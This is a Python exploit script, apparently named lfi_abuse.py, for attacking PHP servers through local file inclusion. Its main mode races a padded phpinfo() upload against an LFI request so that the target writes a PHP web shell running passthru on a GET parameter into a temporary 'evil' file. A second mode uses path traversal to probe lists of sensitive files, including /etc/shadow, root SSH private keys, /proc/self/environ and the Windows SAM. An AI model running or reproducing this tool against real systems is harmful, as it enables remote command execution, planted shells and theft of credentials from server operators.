#!/usr/bin/python3
import sys
import threading
import socket
import re
import argparse
import os
from concurrent.futures import ThreadPoolExecutor
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

counter = 0

# Linux system log files and configuration paths
LINUX_FILES = [
    # Apache logs
    "/var/log/apache2/access.log",
    "/var/log/apache2/error.log",
    "/var/log/apache/access.log",
    "/var/log/apache/error.log",
    "/var/log/httpd/access_log",
    "/var/log/httpd/access.log",
    "/var/log/httpd/error_log",
    "/var/log/httpd/_error_log",
    "/var/log/httpd/_access_log",
    "/etc/httpd/conf/logs/error_log",
    "/etc/httpd/logs/error_log",
    "/var/log/apache2/_access_log",
    "/var/log/apache2/_error.log",
    "/var/log/apache2/_error_log",
    "/usr/local/apache2/log/error_log",
    "/var/log/httpd-access.log",
    "/usr/local/apache/logs/access_log",
    "/usr/local/apache/logs/access.log",
    "/usr/local/apache/logs/error_log",
    "/usr/local/apache/logs/error.log",
    "/var/log/apache/logs/access.log",
    "/var/log/apache/logs/error.log",
    "/etc/httpd/logs/acces_log",
    "/etc/httpd/logs/acces.log",
    "/etc/httpd/logs/error_log",
    "/etc/httpd/logs/error.log",
    
    # Nginx logs
    "/var/log/nginx/access.log",
    "/var/log/nginx/error.log",
    "/var/log/nginx/error_log",
    "/var/log/nginx/access_log",
    "/var/log/nginx-access.log",
    "/var/log/nginx/mysite.com.access.log",
    "/var/log/nginx/mysite.com.error.log",
    "/var/log/nginx/%saccess.log",
    "/var/log/nginx/%serror.log",
    
    # Web application logs
    "/var/www/logs/access_log",
    "/var/www/logs/access.log",
    "/var/www/logs/error_log",
    "/var/www/logs/error.log",
    
    # System logs
    "/var/log/auth.log",
    "/var/log/vsftpd.log",
    "/var/log/sshd.log",
    "/var/log/mail",
    "/var/mail",
    "/var/log/access_log",
    "/var/log/access.log",
    "/var/log/error_log",
    "/var/log/error.log",
    
    # PHP Session
    "/var/lib/php/sessions/sess_*",
    "/var/lib/php5/sessions/sess_*",
    "/tmp/sess_*",
    
    # Configuration files
    "/etc/apache2/apache2.conf",
    "/usr/local/etc/apache2/httpd.conf",
    "/etc/httpd/conf/httpd.conf",
    
    # System files
    "/proc/self/environ",
    "/etc/passwd",
    "/etc/shadow",
    "/etc/issue",
    "/etc/group",
    "/etc/hostname",
    "/etc/ssh/ssh_config",
    "/etc/ssh/sshd_config",
    "/root/.ssh/id_rsa",
    "/root/.ssh/authorized_keys",
    "/var/spool/mail/root",
    "/etc/passwd"
]

# Windows system file paths
WINDOWS_FILES = [
    # Windows system files
    "/boot.ini",
    "/autoexec.bat",
    "/windows/system32/drivers/etc/hosts",
    "/windows/repair/SAM",
    "/windows/panther/unattended.xml",
    "/windows/panther/unattend/unattended.xml",
    "/WINDOWS/repair/sam",
    "/WINDOWS/repair/system",
    
    # Windows log files
    "/windows/debug/NetSetup.log",
    "/windows/iis5.log",
    "/windows/iis6.log",
    "/windows/iis7.log",
    "/windows/system32/logfiles/W3SVC/iis*.log",
    "/windows/system32/logfiles/W3SVC1/ex*",
    "/windows/system32/logfiles/httperr/*.log",
    
    # IIS configuration
    "/inetpub/wwwroot/web.config",
    "/inetpub/wwwroot/global.asa",
    "/inetpub/logs/LogFiles/W3SVC1/*.log",
    
    # XAMPP related paths
    "/xampp/apache/logs/access.log",
    "/xampp/apache/logs/error.log",
    "/xampp/apache/conf/httpd.conf",
    "/xampp/php/php.ini",
    
    # Other service logs
    "/Program Files/MySQL/data/mysql/user.frm",
    "/Program Files/MySQL/data/mysql/user.MYD",
    "/Program Files/MySQL/data/mysql/user.MYI"
]

class ThreadWorker(threading.Thread):
    def __init__(self, event, lock, max_attempts, evil_file, host, port, php_info_req, offset, lfi_req, tag):
        threading.Thread.__init__(self)
        self.event = event
        self.lock = lock
        self.max_attempts = max_attempts
        self.evil_file = evil_file
        self.host = host
        self.port = port
        self.php_info_req = php_info_req
        self.offset = offset
        self.lfi_req = lfi_req
        self.tag = tag

    def phpinfo_lfi(self):
        """Perform the PHPInfo LFI exploit"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as phpinfo_s, \
                 socket.socket(socket.AF_INET, socket.SOCK_STREAM) as lfi_s:
                phpinfo_s.connect((self.host, self.port))
                lfi_s.connect((self.host, self.port))
                phpinfo_s.sendall(self.php_info_req)
                data = b""
                while len(data) < self.offset:
                    data += phpinfo_s.recv(self.offset)
                i = data.index(b"[tmp_name] =")
                match = re.search(br'\[tmp_name\] =&gt; (.*)\n', data[i:])
                # print(match.group(1))
                if not match:
                    print("not found tmp_name")
                    return None
                filename = match.group(1)
                lfi_s.sendall(self.lfi_req % filename)
                # print(self.lfi_req % filename)
                response = lfi_s.recv(4096)
                # print(response)
                if self.tag in response:
                    return filename.decode()
                return None
        except Exception as e:
            print(f"Error in phpinfo_lfi: {e}")
            return None

    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter >= self.max_attempts:
                    return
                counter += 1
            try:
                result = self.phpinfo_lfi()
                if self.event.is_set():
                    break
                if result:
                    print("\nGot it! Shell created in %s" % self.evil_file.decode())
                    self.event.set()
            except socket.error:
                return

def send_request(host, port, request):
    """Send a request and return the response"""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((host, port))
            s.sendall(request)
            response = b""
            while True:
                data = s.recv(4096)
                if not data:
                    break
                response += data
                if data.endswith(b"0\r\n\r\n"):
                    break
        return response
    except socket.error as e:
        print(f"Socket error: {e}")
        return None


def setup(host, phpinfo_path, lfi_path, tmp_dir):
    print("set up...")
    tag = b"Security Test"
    evil_file = os.path.join(tmp_dir, "evil").encode()
    payload = b"""%b\r
<?php $c=fopen('%b','w');fwrite($c,'<?php passthru($_GET[\"f\"]);?>');?>\r""" % (tag, evil_file)
    req1_data = b"""-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
%b
-----------------------------7dbff1ded0714--\r""" % payload
    padding = b"A" * 5000
    req1_template = b"""POST %b?a=%b HTTP/1.1\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=%b\r
HTTP_ACCEPT: %b\r
HTTP_USER_AGENT: %b\r
HTTP_ACCEPT_LANGUAGE: %b\r
HTTP_PRAGMA: %b\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %d\r
Host: %s\r
\r
%b"""
    req1 = req1_template % (
        phpinfo_path.encode(), padding, padding, padding, padding, padding, padding,
        len(req1_data), host.encode(), req1_data
    )
    lfi_req = b"GET %b%b HTTP/1.1\r\nUser-Agent: Mozilla/4.0\r\nProxy-Connection: Keep-Alive\r\nHost: %b\r\n\r\n" % (
        lfi_path.encode(), b"%b", host.encode()
    )
    return (req1, tag, lfi_req, evil_file)

def get_offset(host, port, php_info_req):
    """Gets offset of tmp_name in the php output"""
    response = send_request(host, port, php_info_req)
    if response is None:
        raise ValueError("Failed to get response from server")
    i = response.find(b"[tmp_name] =")
    if i == -1:
        print(f"Response received: {response.decode(errors='replace')}")
        raise ValueError("No php tmp_name in phpinfo output")
    print(response[i:i+64])
    print("found %s at %i" % (response[i:i+10].decode(), i))
    return i + 256

def run_enumeration_mode(args):
    """Run in file enumeration mode"""
    print("[*] Starting file enumeration...")
    vulnerable_files = enumerate_files(args)
    if not vulnerable_files:
        print("[-] File enumeration failed")
        sys.exit(1)

def run_phpinfo_exploit(args):
    """Run in PHPInfo exploitation mode"""
    print("[*] Starting LFI via phpinfo()...")
    port = args.port
    pool_size = args.threads
    php_info_path = args.phpinfo
    lfi_path = args.lfi
    platform = args.platform
    tmp_dir = args.tmp_dir if args.tmp_dir else ("/tmp" if platform == "linux" else "/xampp/tmp")

    print(f"Platform: {platform}")
    print(f"Temporary directory: {tmp_dir}")
    print(f"LFI path: {lfi_path}")
    print(f"PHPInfo path: {php_info_path}")

    print("Getting initial offset...")
    req_php, tag, lfi_req, evil_file = setup(args.host, php_info_path, lfi_path, tmp_dir)
    offset = get_offset(args.host, port, req_php)
    sys.stdout.flush()
    max_attempts = 10000
    event = threading.Event()
    lock = threading.Lock()
    print("Spawning worker pool (%d)..." % pool_size)
    sys.stdout.flush()
    thread_pool = [ThreadWorker(event, lock, max_attempts, evil_file, args.host, port, req_php, offset, lfi_req, tag) 
                   for _ in range(pool_size)]
    for thread in thread_pool:
        thread.start()

    try:
        while not event.wait(1):
            if event.is_set():
                break
            with lock:
                sys.stdout.write("\r% 4d / % 4d" % (counter, max_attempts))
                sys.stdout.flush()
            if counter >= max_attempts:
                break
        print()
        if event.is_set():
            print("Woot!")
        else:
            print(":(")
    except KeyboardInterrupt:
        print("\nTelling threads to shutdown...")
        event.set()
    print("Shutting down...")
    for thread in thread_pool:
        thread.join()

def enumerate_files(args):
    """Enumerate files accessible through LFI"""
    lfi_path = args.lfi
    vulnerable_files = []
    
    # Select file list based on target platform
    if args.platform == 'windows':
        file_list = WINDOWS_FILES
        print("[*] Testing Windows files...")
    else:
        file_list = LINUX_FILES
        print("[*] Testing Linux files...")
    
    print(f"Platform: {args.platform}")
    print(f"LFI path: {lfi_path}")
    print(f"[*] Total files to test: {len(file_list)}")
    
    for file_path in file_list:
        try:
            test_url = f"http://{args.host}:{args.port}{lfi_path}../../../../../..{file_path}"
            response = requests.get(test_url, verify=False, timeout=3)
            if response.status_code == 200 and len(response.content) > 0:
                print(f"[+] Found accessible file: {file_path}")
                vulnerable_files.append(file_path)
        except Exception as e:
            print(f'[-] except: {e}')
            continue
    
    if vulnerable_files:
        print(f"[+] Found {len(vulnerable_files)} accessible files")
        return vulnerable_files
    else:
        print("[-] No accessible files found")
        return None

def main():
    print('''Example: 
    1. PHPInfo exploit:
       python lfi_abuse.py 127.0.0.1 80 -lfi "/lfi.php?file=" -p "linux" -tmp_dir "/tmp" -phpinfo "/phpinfo.php"
    2. File enumeration:
       python lfi_abuse.py 127.0.0.1 80 -lfi "/lfi.php?file=" -enum-files -p "linux"
    ''')
    parser = argparse.ArgumentParser(description="LFI With PHPInfo() and File Enumeration")
    parser.add_argument("host", help="Target hostname or IP, e.g., 127.0.0.1")
    parser.add_argument("port", type=int, help="Port number, e.g., 80")
    parser.add_argument("-lfi", required=True, help="LFI path (e.g., lfi.php?file=)")
    parser.add_argument("-phpinfo", default="php/phpinfo.php", help="PHPInfo path (default: php/phpinfo.php)")
    parser.add_argument("-p", "--platform", choices=['linux', 'windows'], default="linux", 
                        help="Platform: linux or windows (default: linux)")
    parser.add_argument("-tmp_dir", help="Temporary directory (default: /tmp for linux, /xampp/tmp for windows)")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads (default: 10)")
    parser.add_argument("-enum-files", action="store_true", help="Enable file enumeration mode")
    args = parser.parse_args()

    print("LFI With PHPInfo()")
    print("-=" * 30)

    try:
        args.host = socket.gethostbyname(args.host)
    except socket.error as e:
        print(f"Error with hostname {args.host}: {e}")
        sys.exit(1)

    # Choose operational mode
    if args.enum_files:
        run_enumeration_mode(args)
    else:
        run_phpinfo_exploit(args)

if __name__ == "__main__":
    main()
